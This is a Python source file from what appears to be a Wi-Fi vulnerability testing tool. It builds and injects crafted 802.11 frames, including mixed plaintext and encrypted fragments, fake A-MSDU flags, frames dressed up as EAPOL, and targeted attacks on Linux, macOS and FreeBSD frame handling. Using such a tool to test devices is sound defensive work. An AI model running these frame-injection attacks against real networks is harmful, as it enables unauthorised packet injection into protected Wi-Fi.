from fraginternals import *
import copy

class PingTest(Test):
	def __init__(self, ptype, fragments, separate_with=None, opt=None):
		super().__init__(fragments)
		self.ptype = ptype
		self.separate_with = separate_with

		self.bcast_ra = False if opt == None else opt.bcast_ra
		self.bcast_dst = False if opt == None else opt.bcast_dst
		self.as_msdu = False if opt == None else opt.as_msdu
		self.icmp_size = None if opt == None else opt.icmp_size
		self.padding = None if opt == None else opt.padding
		self.to_self = False if opt == None else opt.to_self

		self.parse_meta_actions()

	def parse_meta_actions(self):
		# Create list of fragment numbers to be used
		self.fragnums = []
		next_fragnum = 0
		for act in self.actions:
			if act.is_meta(Action.MetaDrop):
				next_fragnum += 1
			elif act.action == Action.Inject:
				self.fragnums.append(next_fragnum)
				next_fragnum += 1
		self.actions = list(filter(lambda act: not act.is_meta(Action.MetaDrop), self.actions))

	def prepare(self, station):
		log(STATUS, "Generating ping test", color="green")

		# Generate the header and payload
		header, request, self.check_fn = generate_request(station, self.ptype, icmp_size=self.icmp_size, padding=self.padding, to_self=self.to_self)

		if self.as_msdu == 1:
			# Set the A-MSDU frame type flag in the QoS header
			header.Reserved = 1
			# Encapsulate the request in an A-MSDU payload
			request = create_msdu_subframe(station.mac, station.get_peermac(), request)
		elif self.as_msdu == 2:
			# Set A-MSDU flag but include a normal payload (fake A-MSDU)
			header.Reserved = 1

		# Generate all the individual (fragmented) frames
		num_frags = len(self.get_actions(Action.Inject))
		frames = create_fragments(header, request, num_frags)

		# Assign frames to the existing fragment objects
		for frag, frame in zip(self.get_actions(Action.Inject), frames):
			if self.bcast_ra:
				frame.addr1 = "ff:ff:ff:ff:ff:ff"
			if self.bcast_dst:
				if header.FCfield & Dot11(FCfield="to-DS").FCfield != 0:
					frame.addr3 = "ff:ff:ff:ff:ff:ff"
				else:
					frame.addr1 = "ff:ff:ff:ff:ff:ff"

			# Assign fragment numbers according to MetaDrop rules
			frame.SC = (frame.SC & 0xfff0) | self.fragnums.pop(0)

			frag.frame = frame

		# Put the separator after each fragment if requested.
		if self.separate_with != None:
			for i in range(len(self.actions) - 1, 0, -1):
				# Check if the previous action is indeed an injection
				prev_frag = self.actions[i - 1]
				if prev_frag.action != Action.Inject:
					continue

				# Create a similar inject action for the seperator
				sep_frag = Action(prev_frag.trigger, enc=prev_frag.encrypted)
				sep_frag.frame = self.separate_with.copy()
				station.set_header(sep_frag.frame)

				self.actions.insert(i, sep_frag)

class ForwardTest(Test):
	def __init__(self, eapol=False, dst=None, large=False):
		actions = [Action(Action.Connected, enc=True)]
		if eapol:
			actions = [Action(Action.StartAuth, enc=False)]
		if large:
			actions += copy.deepcopy(actions)

		super().__init__(actions)
		self.eapol = eapol
		self.dst = dst
		self.large = large
		self.magic = b"forwarded_data"

	def prepare(self, station):
		# Construct the header of the frame
		header = station.get_header(prior=2)
		if header.FCfield & Dot11(FCfield="to-DS").FCfield == 0:
			log(ERROR, "It makes no sense to test whether a client forwards frames??")

		if self.dst == None:
			header.addr3 = station.mac
			self.check_fn = lambda p: self.magic in raw(p)
		else:
			header.addr3 = self.dst

		# Determine the type of data to send
		if self.eapol:
			request = LLC()/SNAP()/EAPOL()/Raw(self.magic)
		else:
			request = LLC()/SNAP()/IP()/Raw(self.magic)

		# Wether to send large requests
		if self.large:
			request = request/Raw(b"A" * 1500)

		# Create the actual frame(s)
		frames = create_fragments(header, request, len(self.actions))
		for frag, frame in zip(self.get_actions(Action.Inject), frames):
			frag.frame = frame


class LinuxTest(Test):
	def __init__(self, ptype, decoy_tid=None):
		super().__init__([
			# Note: to inject immediately after 4-way provide IPs using --ip and --peerip
			Action(Action.Connected, Action.GetIp),
			Action(Action.Connected, enc=True),
			Action(Action.Connected, enc=True),
			Action(Action.Connected, enc=False)
		])
		self.ptype = ptype
		self.decoy_tid = decoy_tid

	def prepare(self, station):
		header, request, self.check_fn = generate_request(station, self.ptype)
		frag1, frag2 = create_fragments(header, request, 2)

		# Fragment 1: normal
		self.actions[0].frame = frag1

		# Fragment 2: make Linux update latest used crypto Packet Number. Use a dummy packet
		# that can't accidently aggregate with the first fragment in a corrrect packet.
		p = station.get_header(prior=2)/LLC()/SNAP()/IP()/Raw(b"linux_plain decoy fragment")
		p.SC = frag2.SC ^ (1 << 4)

		# - In the attack against Linux, the decoy frame must have the same QoS TID.
		# - On the other hand, some devices seem to only cache fragments for one sequence
		#   number per QoS priority. So to avoid overwriting the first fragment, add this
		#   option to use a different priority for it.
		p.TID = 2
		if self.decoy_tid != None:
			p.TID = 3

		self.actions[1].frame = p

		# Fragment 3: can now inject last fragment as plaintext
		self.actions[2].frame = frag2

class MacOsTest(Test):
	"""
	See docs/macoxs-reversing.md for background on the attack.
	"""
	def __init__(self, ptype, actions, bcast_dst):
		super().__init__(actions)
		self.ptype = ptype
		self.bcast_dst = bcast_dst

	def prepare(self, station):
		# First fragment is the start of an EAPOL frame
		header = station.get_header(prior=2)
		request = LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A"*32)
		frag1, _ = create_fragments(header, data=request, num_frags=2)

		# Second fragment has same sequence number. Will be accepted
		# before authenticated because previous fragment was EAPOL.
		# By sending to broadcast, this fragment will not be reassembled
		# though, meaning it will be treated as a full frame (and not EAPOL).
		_, request, check_fn = generate_request(station, self.ptype)
		frag2, = create_fragments(header, data=request, num_frags=1)
		frag2.SC |= 1
		frag2.addr1 = "ff:ff:ff:ff:ff:ff"

		# We can automatically detect result if the last fragment was
		# sent after the authentication
		if self.actions[-1].trigger >= Action.AfterAuth:
			self.check_fn = check_fn

		# Practically all APs will not process frames with a broadcast receiver address, unless
		# they are operating in client mode. But to test APs without tcpdump anyway, allow the
		# ping to be send to a broadcast destination, so other STAs can monitor for it.
		if self.bcast_dst and frag2.FCfield & Dot11(FCfield="to-DS").FCfield != 0:
			frag2.addr3 = "ff:ff:ff:ff:ff:ff"

		self.actions[0].frame = frag1
		self.actions[1].frame = frag2

class EapolTest(Test):
	# TODO:
	# Test 1: plain unicast EAPOL fragment, plaintext broadcast frame => trivial frame injection
	# Test 2: plain unicast EAPOL fragment, encrypted broadcast frame => just an extra test
	# Test 3: plain unicast EAPOL fragment, encrypted unicast fragment => demonstrates mixing of plain/encrypted fragments
	# Test 4: EAPOL and A-MSDU tests?
	def __init__(self):
		super().__init__([
			Action(Action.BeforeAuth, enc=False),
			Action(Action.BeforeAuth, enc=False)
		])

	def prepare(self, station):
		header = station.get_header(prior=2)
		request = LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A"*32)
		frag1, frag2 = create_fragments(header, data=request, num_frags=2)

		frag1copy, frag2copy = create_fragments(header, data=request, num_frags=2)
		frag1copy.addr1 = "ff:ff:ff:ff:ff:ff"
		frag2copy.addr1 = "ff:ff:ff:ff:ff:ff"

		self.actions[0].frame = frag1
		self.actions[0].frame = frag2


class EapolAmsduTest(Test):
	def __init__(self, ptype, actions, freebsd=False, opt=None):
		super().__init__(actions)
		self.ptype = ptype
		self.freebsd = freebsd
		self.bcast_dst = False if opt == None else opt.bcast_dst

	def prepare(self, station):
		log(STATUS, "Generating ping test", color="green")

		# Generate the single frame
		header, request, check_fn = generate_request(station, self.ptype)
		# Set the A-MSDU frame type flag in the QoS header
		header.Reserved = 1
		# Testing
		#header.addr2 = "00:11:22:33:44:55"

		# We can automatically detect result if the last fragment was
		# sent after the authentication
		if self.actions[-1].trigger >= Action.AfterAuth:
			self.check_fn = check_fn

		mac_src = station.mac
		mac_dst = station.get_peermac()
		if self.bcast_dst:
			mac_dst = "ff:ff:ff:ff:ff:ff"

		# Masquerade A-MSDU frame as an EAPOL frame
		if self.freebsd:
			log(STATUS, "Creating malformed EAPOL/MSDU that FreeBSD treats as valid")
			request = freebsd_create_eapolmsdu(mac_src, mac_dst, request)
		else:
			request = LLC()/SNAP()/EAPOL()/Raw(b"\x00\x06AAAAAA") / create_msdu_subframe(mac_src, mac_dst, request)

		frames = create_fragments(header, request, 1)
		toinject = frames[0]

		# Make sure addr1/3 matches the destination address in the A-MSDU subframe(s)
		if self.bcast_dst:
			if toinject.FCfield & Dot11(FCfield="to-DS").FCfield != 0:
				toinject.addr3 = "ff:ff:ff:ff:ff:ff"
			else:
				toinject.addr1 = "ff:ff:ff:ff:ff:ff"

		# XXX Where was this needed again?
		auth = Dot11()/Dot11Auth(status=0, seqnum=1)
		station.set_header(auth)
		auth.addr2 = "00:11:22:33:44:55"

		self.actions[0].frame = auth
		self.actions[1].frame = toinject


